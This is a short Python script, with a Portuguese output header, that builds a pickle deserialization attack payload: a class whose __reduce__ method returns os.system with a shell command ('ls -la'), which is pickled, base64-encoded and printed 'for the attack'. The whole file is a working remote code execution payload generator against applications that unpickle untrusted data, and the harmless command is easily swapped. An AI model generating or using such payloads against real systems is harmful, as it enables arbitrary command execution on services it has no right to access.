import pickle
import base64
import os

class RCEPayload:
    def __reduce__(self):
        command = "ls -la"

        return (os.system, (command,))

payload_object = RCEPayload()

pickled_payload = pickle.dumps(payload_object)

b64_payload = base64.b64encode(pickled_payload)

print("----- PAYLOAD PARA O ATAQUE -----")
print(b64_payload.decode())
